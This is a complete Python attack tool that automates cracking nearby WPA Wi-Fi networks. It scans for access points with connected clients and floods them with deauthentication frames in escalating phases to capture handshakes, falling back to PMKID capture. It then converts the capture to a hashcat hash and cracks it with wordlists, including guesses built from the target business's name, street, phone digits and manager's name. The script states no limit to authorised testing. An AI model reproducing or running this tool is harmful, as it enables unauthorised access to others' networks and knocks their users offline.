#!/usr/bin/env python3
"""
crack.py
--------
STRICT: Only targets APs with connected clients.
Smart cracking: wordlist → context generation → append & retry.
Fixed: CSV parsing, injection check, aggressive handshake capture.
"""

import argparse
import os
import signal
import subprocess
import sys
import time
import itertools
from datetime import datetime
from collections import defaultdict


# ─────────────────────────────────────────────────────────────────────────────
#  CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────

CURRENT_YEAR = datetime.now().year
YEAR_MARGIN  = 20
SYMBOLS      = ["!", "@", "#", "$", "%", "&", "*", ".", "-", "_", "?", "=", "+"]
COMMON_WIFI  = ["wifi", "wlan", "pass", "password", "passwd", "internet",
                "connect", "net", "admin", "guest", "home", "free",
                "public", "secure", "boite", "box", "router", "access"]


# ─────────────────────────────────────────────────────────────────────────────
#  HELPERS - SYSTEM
# ─────────────────────────────────────────────────────────────────────────────

def run(cmd, **kw):
    print("[*] " + " ".join(cmd))
    return subprocess.run(cmd, **kw)


def get_monitor_interface():
    out = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
    current_iface = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            current_iface = line.split()[1]
        elif line.startswith("type monitor") and current_iface:
            return current_iface
    return None


def enable_monitor_mode(iface):
    run(["airmon-ng", "check", "kill"])
    result = subprocess.run(["airmon-ng", "start", iface],
                            capture_output=True, text=True)
    print(result.stdout)
    if result.stderr.strip():
        print(result.stderr)
    mon_iface = get_monitor_interface()
    if not mon_iface:
        print("[-] Monitor interface not found.")
        sys.exit(1)
    print(f"[+] Monitor: {mon_iface}")
    return mon_iface


def disable_monitor_mode(mon_iface):
    run(["airmon-ng", "stop", mon_iface])
    run(["systemctl", "restart", "NetworkManager"])


def force_channel(mon_iface, channel):
    subprocess.run(["iw", "dev", mon_iface, "set", "channel", str(channel)],
                   capture_output=True)


def check_injection(mon_iface, bssid):
    """Test if injection works against target AP."""
    print("[*] Testing packet injection...")
    result = subprocess.run(
        ["aireplay-ng", "--test", "-b", bssid, mon_iface],
        capture_output=True, text=True, timeout=40
    )
    output = result.stdout + result.stderr
    if "Injection is working" in output or "injecting" in output.lower():
        print("[+] Injection OK!")
        return True
    else:
        print("[!] Injection test failed or uncertain.")
        print(f"    {output[:200]}")
        return False


# ─────────────────────────────────────────────────────────────────────────────
#  SCAN
# ─────────────────────────────────────────────────────────────────────────────

def scan_with_clients_only(mon_iface, duration=40,
                           out_prefix="/tmp/p3wifi_scan", band="abg"):
    """Scan and return ONLY networks that have connected clients."""
    print(f"[*] Scanning for {duration}s...")

    subprocess.run(["pkill", "-f", f"airodump-ng.*{out_prefix}"],
                   capture_output=True)
    time.sleep(1)

    # clean old files
    for f in os.listdir("/tmp"):
        if f.startswith("p3wifi_scan"):
            try:
                os.remove(f"/tmp/{f}")
            except Exception:
                pass

    log_f = open(out_prefix + ".log", "w")
    proc = subprocess.Popen(
        ["airodump-ng", "--band", band, "--output-format", "csv",
         "-w", out_prefix, mon_iface],
        stdout=log_f, stderr=log_f
    )

    for r in range(duration, 0, -5):
        print(f"    {r}s...")
        time.sleep(5)

    proc.send_signal(signal.SIGINT)
    proc.wait()
    log_f.close()
    time.sleep(1)

    csv_path = out_prefix + "-01.csv"
    networks = {}
    clients_by_ap = defaultdict(list)

    if not os.path.exists(csv_path):
        print(f"[-] CSV not found: {csv_path}")
        return networks, clients_by_ap

    with open(csv_path, errors="ignore") as f:
        raw = f.read()

    lines = raw.splitlines()
    in_stations = False

    for line in lines:
        if line.startswith("Station MAC"):
            in_stations = True
            continue

        if not in_stations:
            # ── AP section ────────────────────────────────────────────────
            # BSSID, First time seen, Last time seen, channel, Speed,
            # Privacy, Cipher, Authentication, Power, # beacons,
            # # IV, LAN IP, ID-length, ESSID, Key
            if not line.strip() or line.startswith("BSSID"):
                continue
            parts = line.split(",")
            if len(parts) > 13:
                bssid   = parts[0].strip()
                channel = parts[3].strip()
                power   = parts[8].strip()
                essid   = parts[13].strip()
                if (bssid and essid and bssid != "BSSID"
                        and len(bssid) == 17):
                    networks[bssid] = (channel, essid, power)
        else:
            # ── Station section ───────────────────────────────────────────
            # Station MAC, First time seen, Last time seen, Power,
            # # packets, BSSID, Probed ESSIDs
            if not line.strip():
                continue
            parts = line.split(",")
            if len(parts) >= 6:
                cmac       = parts[0].strip()
                last_seen  = parts[2].strip()   # FIXED: was parts[1]
                power      = parts[3].strip()   # FIXED: was parts[2]
                bssid      = parts[5].strip()   # FIXED: was parts[5] ok
                if (cmac and bssid
                        and len(cmac) == 17 and len(bssid) == 17):
                    clients_by_ap[bssid].append((cmac, power, last_seen))

    return networks, clients_by_ap


# ─────────────────────────────────────────────────────────────────────────────
#  VERIFY CLIENT
# ─────────────────────────────────────────────────────────────────────────────

def verify_client_alive(mon_iface, bssid, channel,
                        client_mac, timeout=12):
    """Check if the client is still associated."""
    print(f"[*] Verifying client {client_mac} on {bssid} ch{channel}...")

    force_channel(mon_iface, channel)
    time.sleep(1)

    test_prefix = "/tmp/verify_test"

    # clean old files
    for fn in os.listdir("/tmp"):
        if fn.startswith("verify_test"):
            try:
                os.remove(f"/tmp/{fn}")
            except Exception:
                pass

    proc = subprocess.Popen(
        ["airodump-ng", "-c", str(channel), "--bssid", bssid,
         "-w", test_prefix, "--output-format", "csv", mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(timeout)
    proc.send_signal(signal.SIGINT)
    proc.wait()
    time.sleep(1)

    csv_path = test_prefix + "-01.csv"
    found = False
    if os.path.exists(csv_path):
        with open(csv_path, errors="ignore") as f:
            raw = f.read()
        in_stations = False
        for line in raw.splitlines():
            if line.startswith("Station MAC"):
                in_stations = True
                continue
            if in_stations and line.strip():
                parts = line.split(",")
                if len(parts) >= 6 and parts[0].strip() == client_mac:
                    power = parts[3].strip()   # FIXED column
                    found = True
                    print(f"[+] Client confirmed active! Power: {power}dBm")
                    break

    for fn in os.listdir("/tmp"):
        if fn.startswith("verify_test"):
            try:
                os.remove(f"/tmp/{fn}")
            except Exception:
                pass

    return found


# ─────────────────────────────────────────────────────────────────────────────
#  CAPTURE HANDSHAKE  (aggressive multi-strategy)
# ─────────────────────────────────────────────────────────────────────────────

def check_cap_for_handshake(cap_file, bssid, essid):
    """Return True if handshake found in cap file."""
    if not os.path.exists(cap_file):
        return False

    # method 1: aircrack-ng
    check = subprocess.run(
        ["aircrack-ng", "-b", bssid, cap_file],
        capture_output=True, text=True
    )
    if "1 handshake" in check.stdout or "handshake" in check.stdout.lower():
        return True

    # method 2: tshark EAPOL count >= 2
    try:
        tc = subprocess.run(
            ["tshark", "-r", cap_file, "-Y",
             f"eapol && (wlan.addr == {bssid})",
             "-T", "fields", "-e", "eapol.type"],
            capture_output=True, text=True, timeout=5
        )
        if tc.stdout.strip():
            count = len([l for l in tc.stdout.strip().split('\n') if l])
            if count >= 2:
                return True
    except Exception:
        pass

    # method 3: hcxpcapngtool quick check
    tmp_hash = "/tmp/_hs_check.22000"
    subprocess.run(
        ["hcxpcapngtool", "-o", tmp_hash, cap_file],
        capture_output=True
    )
    if os.path.exists(tmp_hash) and os.path.getsize(tmp_hash) > 0:
        os.remove(tmp_hash)
        return True

    return False


def send_deauth_burst(mon_iface, bssid, client_mac, count=64):
    """Send a burst of deauth frames."""
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid,
           "-c", client_mac, mon_iface]
    subprocess.run(cmd, capture_output=True)


def capture_handshake(mon_iface, bssid, channel, essid,
                      out_prefix, client_mac=None, timeout=300):
    """
    Capture WPA handshake - multi-strategy aggressive approach.

    Strategy:
      Phase 1 (0-60s)   : continuous deauth + listen
      Phase 2 (60-120s) : burst deauth every 10s (all clients)
      Phase 3 (120-180s): targeted deauth bursts + channel re-lock
      Phase 4 (180s+)   : broadcast deauth fallback
    """

    print(f"\n[+] === CAPTURING: {essid} ({bssid}) ch {channel} ===")
    print(f"[+] Target client: {client_mac or 'BROADCAST'}")
    print(f"[+] Timeout: {timeout}s | Multi-phase aggressive mode")

    # cleanup
    subprocess.run(["pkill", "-f", f"airodump-ng.*{out_prefix}"],
                   capture_output=True)
    subprocess.run(["pkill", "-f", "aireplay-ng"], capture_output=True)
    time.sleep(2)

    # clean old cap files
    for f in os.listdir("."):
        if f.startswith(out_prefix) and f.endswith(".cap"):
            try:
                os.remove(f)
            except Exception:
                pass

    # lock channel
    force_channel(mon_iface, channel)
    time.sleep(1)

    # start capture
    print(f"[*] Starting airodump-ng capture on CH{channel}...")
    cap_proc = subprocess.Popen(
        ["airodump-ng", "-c", str(channel), "--bssid", bssid,
         "-w", out_prefix, "--output-format", "cap",
         "--write-interval", "1", mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(3)
    force_channel(mon_iface, channel)

    cap_file = out_prefix + "-01.cap"
    found    = False
    elapsed  = 0

    # ── Phase 1: continuous deauth ────────────────────────────────────────
    print("\n[*] PHASE 1: Continuous deauth (0-60s)...")
    cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid]
    if client_mac:
        cmd += ["-c", client_mac]
    cmd.append(mon_iface)
    deauth_proc = subprocess.Popen(cmd,
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL)

    try:
        while elapsed < min(60, timeout):
            time.sleep(5)
            elapsed += 5
            force_channel(mon_iface, channel)

            if os.path.exists(cap_file):
                size = os.path.getsize(cap_file)
                eapol = _count_eapol(cap_file)
                print(f"  [{elapsed}s] {size//1024}KB  EAPOL:{eapol}"
                      + (" *** EAPOL FRAMES! ***" if eapol > 0 else ""))

                if check_cap_for_handshake(cap_file, bssid, essid):
                    found = True
                    print(f"\n[+] HANDSHAKE CAPTURED in Phase 1! ({elapsed}s)")
                    break

        deauth_proc.terminate()
        deauth_proc.wait()

        if found:
            return _finish_capture(cap_proc, cap_file, found, elapsed)

        # ── Phase 2: burst deauth every 10s ───────────────────────────────
        print("\n[*] PHASE 2: Burst deauth every 10s (60-120s)...")
        while elapsed < min(120, timeout):
            # targeted burst
            if client_mac:
                print(f"  [{elapsed}s] Sending 128 deauth → {client_mac}")
                send_deauth_burst(mon_iface, bssid, client_mac, count=128)

            # also broadcast
            print(f"  [{elapsed}s] Sending 64 deauth → BROADCAST")
            cmd_bc = ["aireplay-ng", "--deauth", "64", "-a", bssid,
                      mon_iface]
            subprocess.run(cmd_bc, capture_output=True)

            time.sleep(10)
            elapsed += 10
            force_channel(mon_iface, channel)

            if os.path.exists(cap_file):
                size  = os.path.getsize(cap_file)
                eapol = _count_eapol(cap_file)
                print(f"  [{elapsed}s] {size//1024}KB  EAPOL:{eapol}"
                      + (" *** EAPOL FRAMES! ***" if eapol > 0 else ""))

                if check_cap_for_handshake(cap_file, bssid, essid):
                    found = True
                    print(f"\n[+] HANDSHAKE CAPTURED in Phase 2! ({elapsed}s)")
                    break

        if found:
            return _finish_capture(cap_proc, cap_file, found, elapsed)

        # ── Phase 3: deauth ALL clients (broadcast) ───────────────────────
        print("\n[*] PHASE 3: Broadcast deauth ALL clients (120-180s)...")
        while elapsed < min(180, timeout):
            print(f"  [{elapsed}s] Broadcasting deauth to ALL clients...")
            cmd_all = ["aireplay-ng", "--deauth", "256", "-a", bssid,
                       mon_iface]
            subprocess.run(cmd_all, capture_output=True)

            time.sleep(10)
            elapsed += 10
            force_channel(mon_iface, channel)

            if os.path.exists(cap_file):
                size  = os.path.getsize(cap_file)
                eapol = _count_eapol(cap_file)
                print(f"  [{elapsed}s] {size//1024}KB  EAPOL:{eapol}"
                      + (" *** EAPOL FRAMES! ***" if eapol > 0 else ""))

                if check_cap_for_handshake(cap_file, bssid, essid):
                    found = True
                    print(f"\n[+] HANDSHAKE CAPTURED in Phase 3! ({elapsed}s)")
                    break

        if found:
            return _finish_capture(cap_proc, cap_file, found, elapsed)

        # ── Phase 4: PMKID attack (no client needed) ──────────────────────
        if elapsed < timeout:
            print("\n[*] PHASE 4: Attempting PMKID capture (hcxdumptool)...")
            found = _try_pmkid(mon_iface, bssid, channel,
                               out_prefix, elapsed, timeout)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")

    finally:
        subprocess.run(["pkill", "-f", "aireplay-ng"], capture_output=True)
        cap_proc.send_signal(signal.SIGINT)
        cap_proc.wait()
        time.sleep(2)

    # final check
    if not found and os.path.exists(cap_file):
        if check_cap_for_handshake(cap_file, bssid, essid):
            found = True
            print(f"[+] Handshake found on final check!")
        else:
            check = subprocess.run(["aircrack-ng", "-b", bssid, cap_file],
                                   capture_output=True, text=True)
            for line in check.stdout.split('\n'):
                if line.strip():
                    print(f"  {line}")

    return cap_file, found


def _finish_capture(cap_proc, cap_file, found, elapsed):
    """Stop capture processes cleanly."""
    subprocess.run(["pkill", "-f", "aireplay-ng"], capture_output=True)
    cap_proc.send_signal(signal.SIGINT)
    cap_proc.wait()
    time.sleep(2)
    size = os.path.getsize(cap_file) if os.path.exists(cap_file) else 0
    print(f"[+] Capture complete: {cap_file} ({size//1024}KB)")
    return cap_file, found


def _count_eapol(cap_file):
    """Count EAPOL frames using tshark."""
    try:
        tc = subprocess.run(
            ["tshark", "-r", cap_file, "-Y", "eapol",
             "-T", "fields", "-e", "eapol.type"],
            capture_output=True, text=True, timeout=3
        )
        if tc.stdout.strip():
            return len([l for l in tc.stdout.strip().split('\n') if l])
    except Exception:
        pass
    return 0


def _try_pmkid(mon_iface, bssid, channel, out_prefix, elapsed, timeout):
    """Try PMKID capture using hcxdumptool."""
    pmkid_file = out_prefix + "_pmkid.pcapng"

    # check if hcxdumptool available
    if subprocess.run(["which", "hcxdumptool"],
                      capture_output=True).returncode != 0:
        print("[!] hcxdumptool not found. Install: apt install hcxtools")
        return False

    # write filter file
    filter_file = "/tmp/pmkid_filter.txt"
    with open(filter_file, "w") as f:
        f.write(bssid.replace(":", "").upper() + "\n")

    remaining = min(60, timeout - elapsed)
    print(f"[*] hcxdumptool PMKID capture for {remaining}s...")

    try:
        proc = subprocess.Popen([
            "hcxdumptool",
            "-i", mon_iface,
            "-o", pmkid_file,
            "--filterlist_ap=" + filter_file,
            "--filtermode=2",
            "--enable_status=1"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(remaining)
        proc.terminate()
        proc.wait()
    except Exception as e:
        print(f"[!] hcxdumptool error: {e}")
        return False

    if os.path.exists(pmkid_file) and os.path.getsize(pmkid_file) > 0:
        # convert pmkid
        hash_file = out_prefix + "_pmkid.22000"
        subprocess.run(
            ["hcxpcapngtool", "-o", hash_file, pmkid_file],
            capture_output=True
        )
        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
            print(f"[+] PMKID captured! Hash: {hash_file}")
            return True

    print("[-] PMKID not captured.")
    return False


# ─────────────────────────────────────────────────────────────────────────────
#  CONVERT CAP → HASH
# ─────────────────────────────────────────────────────────────────────────────

def convert_to_hash(cap_file, script_dir):
    """Convert cap to .22000 hash - try multiple methods."""
    hash_file = os.path.join(script_dir, "hash.22000")
    clean_cap = os.path.join(script_dir, "clean.cap")

    # remove old hash
    if os.path.exists(hash_file):
        os.remove(hash_file)

    # method 1: wpaclean + hcxpcapngtool
    print("[*] Method 1: wpaclean + hcxpcapngtool...")
    subprocess.run(["wpaclean", clean_cap, cap_file], capture_output=True)

    if os.path.exists(clean_cap) and os.path.getsize(clean_cap) > 24:
        result = subprocess.run(
            ["hcxpcapngtool", "-o", hash_file, clean_cap],
            capture_output=True, text=True
        )
        print(f"    {result.stdout.strip()}")

    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        print(f"[+] Hash extracted (method 1): {hash_file}")
        return hash_file

    # method 2: direct hcxpcapngtool
    print("[*] Method 2: hcxpcapngtool direct...")
    result = subprocess.run(
        ["hcxpcapngtool", "-o", hash_file, cap_file],
        capture_output=True, text=True
    )
    print(f"    {result.stdout.strip()}")

    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        print(f"[+] Hash extracted (method 2): {hash_file}")
        return hash_file

    # method 3: check for PMKID hash
    pmkid_hash = cap_file.replace("-01.cap", "_pmkid.22000")
    if os.path.exists(pmkid_hash) and os.path.getsize(pmkid_hash) > 0:
        print(f"[+] Using PMKID hash: {pmkid_hash}")
        return pmkid_hash

    print("[-] All hash extraction methods failed.")
    return None


# ─────────────────────────────────────────────────────────────────────────────
#  SMART WORDLIST GENERATION
# ─────────────────────────────────────────────────────────────────────────────

def case_variations(word):
    w = word.strip()
    if not w:
        return []
    variants = {
        w,
        w.lower(),
        w.upper(),
        w.capitalize(),
        w.title(),
        w.lower().replace('a', '@').replace('e', '3')
                 .replace('i', '1').replace('o', '0').replace('s', '$'),
    }
    return [v for v in variants if v]


def year_list():
    out = []
    for y in range(CURRENT_YEAR - YEAR_MARGIN, CURRENT_YEAR + 3):
        out.append(str(y))
        out.append(str(y)[2:])
    return out


def sym_list():
    s = list(SYMBOLS)
    for a, b in itertools.product(SYMBOLS, SYMBOLS):
        s.append(a + b)
    return s


def generate_candidates(base_words, max_candidates=100_000):
    candidates = set()
    years   = year_list()
    symbols = sym_list()

    all_variants = []
    for raw in base_words:
        all_variants.extend(case_variations(raw))
    all_variants = list(set(all_variants))

    for word in all_variants:
        candidates.add(word)
        for y in years:
            candidates.add(word + y)
            candidates.add(y + word)
        for sym in symbols:
            candidates.add(word + sym)
            candidates.add(sym + word)
            candidates.add(sym + word + sym)
        for sym in symbols:
            for y in years:
                candidates.add(word + sym + y)
                candidates.add(word + y + sym)
                candidates.add(sym + word + y)

    for y in years:
        candidates.add(y)
    for sym in SYMBOLS:
        candidates.add(sym)

    for w1, w2 in itertools.permutations(all_variants, 2):
        pair = w1 + w2
        candidates.add(pair)
        candidates.add(w1 + "_" + w2)
        candidates.add(w1 + "-" + w2)
        for y in years:
            candidates.add(pair + y)
        for sym in symbols:
            candidates.add(pair + sym)
        if len(candidates) >= max_candidates * 2:
            break

    filtered = [c for c in candidates if 8 <= len(c) <= 63]
    if len(filtered) > max_candidates:
        filtered = filtered[:max_candidates]
    return sorted(set(filtered))


def gather_context():
    print("\n" + "=" * 62)
    print("  CONTEXT BUILDER  — press ENTER to skip any field")
    print("  Separate multiple values with commas")
    print("=" * 62)

    def ask(prompt):
        raw = input(f"  {prompt}: ").strip()
        return [w.strip() for w in raw.split(",") if w.strip()] if raw else []

    place  = ask("Place / business name  (ex: TC, TechCenter)")
    city   = ask("City / neighbourhood   (ex: Alger, Oran)")
    street = ask("Street / area          (ex: Didouche, Riadh)")
    phone  = ask("Phone / last 4 digits  (ex: 0550, 1234)")
    owner  = ask("Admin / manager name   (ex: Karim, Fatima)")
    extra  = ask("Other keywords         (ex: 2024, student, tc)")
    ssid   = input("\n  SSID (network name)   : ").strip()

    all_words = []
    for g in [place, city, street, phone, owner, extra]:
        all_words.extend(g)
    if ssid:
        all_words.append(ssid)
        for part in ssid.replace("-", " ").replace("_", " ").split():
            all_words.append(part)

    all_words.extend(COMMON_WIFI)
    return all_words, ssid


def build_smart_wordlist(base_words, output_path, max_candidates=100_000):
    print(f"\n[*] Generating smart wordlist (max {max_candidates:,}) ...")
    candidates = generate_candidates(base_words, max_candidates)
    print(f"[+] {len(candidates):,} candidates → {output_path}")
    with open(output_path, "w", errors="ignore") as f:
        for c in candidates:
            f.write(c + "\n")
    return output_path


def append_to_wordlist(wordlist_path, new_candidates):
    existing = set()
    if os.path.exists(wordlist_path):
        with open(wordlist_path, errors="ignore") as f:
            existing = {ln.strip() for ln in f}
    added = 0
    with open(wordlist_path, "a", errors="ignore") as f:
        for c in new_candidates:
            if c not in existing and 8 <= len(c) <= 63:
                f.write(c + "\n")
                existing.add(c)
                added += 1
    print(f"[+] Appended {added:,} new candidates to {wordlist_path}")
    return added


# ─────────────────────────────────────────────────────────────────────────────
#  HASHCAT RUNNER
# ─────────────────────────────────────────────────────────────────────────────

def run_hashcat(hash_file, wordlist, potfile, label=""):
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist not found: {wordlist}")
        return None

    wc = sum(1 for _ in open(wordlist, errors="ignore"))
    print(f"\n[*] {label}")
    print(f"[*] Wordlist   : {wordlist}")
    print(f"[*] Candidates : {wc:,}")
    print("[*] Starting hashcat (live output) ...\n")

    subprocess.run([
        "hashcat", "-m", "22000", "-a", "0",
        "--potfile-path", potfile,
        "-O", "--status", "--status-timer", "5",
        "--force", hash_file, wordlist
    ])

    show = subprocess.run([
        "hashcat", "-m", "22000",
        "--potfile-path", potfile,
        "--show", hash_file
    ], capture_output=True, text=True)

    if show.stdout.strip():
        password = show.stdout.strip().split(":")[-1]
        return password
    return None


# ─────────────────────────────────────────────────────────────────────────────
#  CRACKING MENU
# ─────────────────────────────────────────────────────────────────────────────

def cracking_menu(hash_file, script_dir, essid, args_dict=None):
    potfile    = os.path.join(script_dir, "hashcat.potfile")
    smart_list = os.path.join(script_dir, "smart_wordlist.txt")
    def_dict   = args_dict or os.path.join(script_dir, "dictionary.txt")

    while True:
        print(f"\n{'='*62}")
        print("  CRACKING MENU")
        print(f"{'='*62}")
        print("  [1] Run existing wordlist (dictionary.txt or --dict)")
        print("  [2] Smart context generation + append + retest")
        print("  [3] Big dictionary  (~Downloads folder)")
        print("  [4] Specify custom wordlist path")
        print("  [0] Skip cracking")
        print(f"{'='*62}")

        choice = input("  Choice: ").strip()

        if choice == "0":
            print("[-] Cracking skipped.")
            return None

        elif choice == "1":
            if not os.path.exists(def_dict):
                print(f"[-] Not found: {def_dict}")
                continue
            pwd = run_hashcat(hash_file, def_dict, potfile,
                              label="[DICT] Running dictionary attack")
            if pwd:
                _print_cracked(pwd)
                return pwd
            print("[-] Not found in wordlist.")

        elif choice == "2":
            base_words, ssid_ctx = gather_context()

            # round 1
            build_smart_wordlist(base_words, smart_list, 100_000)
            pwd = run_hashcat(hash_file, smart_list, potfile,
                              label="[SMART-1] First pass")
            if pwd:
                _print_cracked(pwd)
                return pwd

            # expand
            print("\n[-] Not found. Expanding wordlist...")
            extra2 = input("  Add more keywords (comma-separated): ").strip()
            if extra2:
                base_words.extend(
                    [w.strip() for w in extra2.split(",") if w.strip()])

            new_cands = generate_candidates(base_words, 200_000)
            append_to_wordlist(smart_list, new_cands)

            pwd = run_hashcat(hash_file, smart_list, potfile,
                              label="[SMART-2] Expanded pass")
            if pwd:
                _print_cracked(pwd)
                return pwd
            print("[-] Not found after expansion.")

        elif choice == "3":
            big = os.path.expanduser(
                "~/Downloads/p3wifi_dict_16.04.2026/p3wifi_dict_16.04.2026.txt"
            )
            if not os.path.exists(big):
                print(f"[-] Not found: {big}")
                alt = input("  Enter path manually (ENTER to skip): ").strip()
                if alt and os.path.exists(alt):
                    big = alt
                else:
                    continue
            pwd = run_hashcat(hash_file, big, potfile,
                              label="[BIG DICT] Large dictionary attack")
            if pwd:
                _print_cracked(pwd)
                return pwd
            print("[-] Not found in big dict.")

        elif choice == "4":
            path = input("  Wordlist path: ").strip()
            if not os.path.exists(path):
                print(f"[-] Not found: {path}")
                continue
            pwd = run_hashcat(hash_file, path, potfile,
                              label="[CUSTOM] Custom wordlist attack")
            if pwd:
                _print_cracked(pwd)
                return pwd
            print("[-] Not found.")

        else:
            print("[!] Invalid choice.")
            continue

        again = input("\n  Try another method? [Y/n]: ").strip().lower()
        if again == 'n':
            print(f"\n[-] Password not found in any wordlist.")
            print(f"    Hash: {hash_file}")
            print(f"\n    Brute-force tips:")
            print(f"    # 8-digit number")
            print(f"    hashcat -m 22000 -a 3 {hash_file} ?d?d?d?d?d?d?d?d")
            print(f"    # 8-char mixed")
            print(f"    hashcat -m 22000 -a 3 {hash_file} ?a?a?a?a?a?a?a?a")
            return None


def _print_cracked(password):
    print(f"\n{'*'*62}")
    print(f"  [+] PASSWORD CRACKED : {password}")
    print(f"{'*'*62}")


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface",     default="wlan0")
    parser.add_argument("--scan-time", type=int, default=40)
    parser.add_argument("--band",      default="abg")
    parser.add_argument("--out",       default="capture")
    parser.add_argument("--timeout",   type=int, default=300)
    parser.add_argument("--dict",      default=None)
    parser.add_argument("--verbose",   "-v", action="store_true")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("Run as root.")
        sys.exit(1)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)
    dict_path = args.dict or os.path.join(script_dir, "dictionary.txt")

    mon_iface = enable_monitor_mode(args.iface)

    try:
        # ── SCAN ──────────────────────────────────────────────────────────
        networks, clients_by_ap = scan_with_clients_only(
            mon_iface, args.scan_time, band=args.band
        )

        ap_list = []
        for bssid, (ch, essid, pwr) in sorted(
                networks.items(),
                key=lambda x: int(x[1][0]) if x[1][0].isdigit() else 99):
            n_clients = len(clients_by_ap.get(bssid, []))
            if n_clients > 0:
                ap_list.append((bssid, ch, essid, pwr, n_clients))

        if not ap_list:
            print("\n[-] No networks with connected clients found.")
            print("    Try: --scan-time 60 --band abg")
            return

        # ── DISPLAY ────────────────────────────────────────────────────────
        print(f"\n{'='*70}")
        print(f"  NETWORKS WITH CLIENTS ({len(ap_list)} found)")
        print(f"{'='*70}")

        ssid_groups = defaultdict(list)
        for bssid, ch, essid, pwr, nc in ap_list:
            ssid_groups[essid].append((bssid, ch, pwr, nc))

        ssid_list = []
        for idx, (essid, aps) in enumerate(sorted(ssid_groups.items())):
            total = sum(nc for _, _, _, nc in aps)
            print(f"\n  [{idx}] {essid} ({total} clients)")
            for bssid, ch, pwr, nc in aps:
                print(f"       {bssid}  CH {ch:<3} {pwr}dBm  [{nc} clients]")
            ssid_list.append((essid, aps))

        # ── SELECT AP ──────────────────────────────────────────────────────
        ssid_idx = int(input(f"\nSelect network (0-{len(ssid_list)-1}): "))
        essid, aps = ssid_list[ssid_idx]

        print(f"\n[+] Selected: {essid}")
        if len(aps) > 1:
            for i, (b, ch, pw, nc) in enumerate(aps):
                print(f"    [{i}] {b}  CH {ch}  {pw}dBm  [{nc} clients]")
            ap_idx = int(input(f"Select AP (0-{len(aps)-1}): "))
        else:
            ap_idx = 0

        bssid, channel, pwr, n_clients = aps[ap_idx]

        # ── SELECT CLIENT ──────────────────────────────────────────────────
        ap_clients = clients_by_ap[bssid]
        print(f"\n  Clients on {essid}:")
        for j, (cm, pw, ts) in enumerate(ap_clients):
            print(f"    [{j}] {cm}  {pw}dBm  (last seen: {ts})")

        c_in       = input(f"\nSelect client (0-{len(ap_clients)-1}): ").strip()
        client_mac = ap_clients[int(c_in) if c_in else 0][0]
        print(f"\n[>>] TARGET: {essid} → {bssid} CH{channel} → {client_mac}")

        # ── INJECTION TEST ─────────────────────────────────────────────────
        force_channel(mon_iface, channel)
        check_injection(mon_iface, bssid)

        # ── VERIFY CLIENT ──────────────────────────────────────────────────
        alive = verify_client_alive(mon_iface, bssid, channel,
                                    client_mac, timeout=12)
        if not alive:
            print("[!] Client not seen in quick scan.")
            if input("Continue anyway? [y/N]: ").strip().lower() != 'y':
                return

        # ── CAPTURE ────────────────────────────────────────────────────────
        cap_file, found = capture_handshake(
            mon_iface, bssid, channel, essid, args.out,
            client_mac=client_mac,
            timeout=args.timeout
        )

        if not found:
            print("\n[-] Handshake not captured.")
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
                if input("Try to crack anyway? [y/N]: ").strip().lower() != 'y':
                    return
            else:
                return

        # ── CONVERT ────────────────────────────────────────────────────────
        hash_file = convert_to_hash(cap_file, script_dir)
        if not hash_file:
            print("\n[-] Hash extraction failed.")
            print(f"    Manual: aircrack-ng -w {dict_path} "
                  f"-e '{essid}' -b {bssid} {cap_file}")
            return

        # ── CRACK ──────────────────────────────────────────────────────────
        cracking_menu(hash_file, script_dir, essid, args_dict=dict_path)

    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
    finally:
        disable_monitor_mode(mon_iface)


if __name__ == "__main__":
    main()
